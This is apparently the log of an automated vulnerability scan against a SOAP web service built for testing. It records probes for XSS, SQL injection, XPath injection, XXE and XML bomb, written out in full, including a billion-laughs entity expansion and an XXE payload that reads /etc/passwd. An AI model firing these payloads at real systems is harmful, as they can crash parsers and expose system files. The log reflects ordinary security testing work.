18.04.2016 21:16:09 ==> Scan Started: 18.04.2016 21:16:09
18.04.2016 21:16:09 ==> WSDL Address: http://www.wstest.com/XSS.asmx?WSDL
18.04.2016 21:16:09 ==> Parsing WSDL...
18.04.2016 21:16:09 ==> Static Analysis Started
18.04.2016 21:16:09 ==>    Testing: Weak XML Schema: Unbounded Occurrences
18.04.2016 21:16:09 ==>    Testing: Weak XML Schema: Undefined Namespace
18.04.2016 21:16:09 ==>    Testing: Weak WS-SecurityPolicy: Insecure Transport
18.04.2016 21:16:09 ==>    Testing: Weak WS-SecurityPolicy: Insufficient Supporting Token Protection
18.04.2016 21:16:09 ==>    Testing: Weak WS-SecurityPolicy: Tokens Not Protected
18.04.2016 21:16:09 ==> Static Analysis Finished
18.04.2016 21:16:09 ==> Getting Methods...
18.04.2016 21:16:09 ==>  Vulnerability Found - SSL Not Used, Uri Schema is http
18.04.2016 21:16:10 ==> Method: ShowMessage
18.04.2016 21:16:10 ==>    Testing: Unauthenticated Service Method
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==>    txt - string:A
18.04.2016 21:16:10 ==>    Auth Vulnerability Found: A - status code is : 200
18.04.2016 21:16:10 ==>    Testing: Error Based SQL Injection
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    Testing: Cross Site Scripting
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <script>alert(1)</script>
18.04.2016 21:16:10 ==>    Cross Site Scripting Vulnerability Found: <script>alert(1)</script> - Response Text Contains: 
        <script>alert(1)</script>
        
18.04.2016 21:16:10 ==>    Testing: XML Bomb
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:10 ==>    Testing: External Entity Attack - XXE
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:10 ==>    Testing: XPATH Injection
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: 1' or 1=1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: 1' or 1=1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: 1' or 1=1
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: 1' or 1=1
18.04.2016 21:16:10 ==>    Testing: Could not establish trust relationship for the SSL/TLS secure channel.
18.04.2016 21:16:10 ==>    Parameter Count: 1
18.04.2016 21:16:10 ==> Method: XSSTest2
18.04.2016 21:16:10 ==>    Testing: Unauthenticated Service Method
18.04.2016 21:16:10 ==>    Parameter Count: 2
18.04.2016 21:16:10 ==>    txt - string:A
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    Auth Vulnerability Found: A - status code is : 200
18.04.2016 21:16:10 ==>    Testing: Error Based SQL Injection
18.04.2016 21:16:10 ==>    Parameter Count: 2
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:10 ==>    StatusCode: 200
18.04.2016 21:16:10 ==>    Result: '
18.04.2016 21:16:10 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: '
18.04.2016 21:16:11 ==>    Testing: Cross Site Scripting
18.04.2016 21:16:11 ==>    Parameter Count: 2
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <script>alert(1)</script>
18.04.2016 21:16:11 ==>    Cross Site Scripting Vulnerability Found: <script>alert(1)</script> - Response Text Contains: 
        <script>alert(1)</script>
        
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <script>alert(1)</script>
18.04.2016 21:16:11 ==>    Cross Site Scripting Vulnerability Found: <script>alert(1)</script> - Response Text Contains: 
        <script>alert(1)</script>
        
18.04.2016 21:16:11 ==>    Testing: XML Bomb
18.04.2016 21:16:11 ==>    Parameter Count: 2
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:11 ==>    Testing: External Entity Attack - XXE
18.04.2016 21:16:11 ==>    Parameter Count: 2
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    txt - string:A
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:11 ==>    Testing: XPATH Injection
18.04.2016 21:16:11 ==>    Parameter Count: 2
18.04.2016 21:16:11 ==>    a - boolean:true
18.04.2016 21:16:11 ==>    StatusCode: 200
18.04.2016 21:16:11 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    a - boolean:true
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    a - boolean:true
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    a - boolean:true
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    txt - string:A
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    txt - string:A
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    txt - string:A
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    txt - string:A
18.04.2016 21:16:12 ==>    StatusCode: 200
18.04.2016 21:16:12 ==>    Result: 1' or 1=1
18.04.2016 21:16:12 ==>    Testing: Could not establish trust relationship for the SSL/TLS secure channel.
18.04.2016 21:16:12 ==>    Parameter Count: 2
18.04.2016 21:16:20 ==> Scan Finished: 18.04.2016 21:16:20
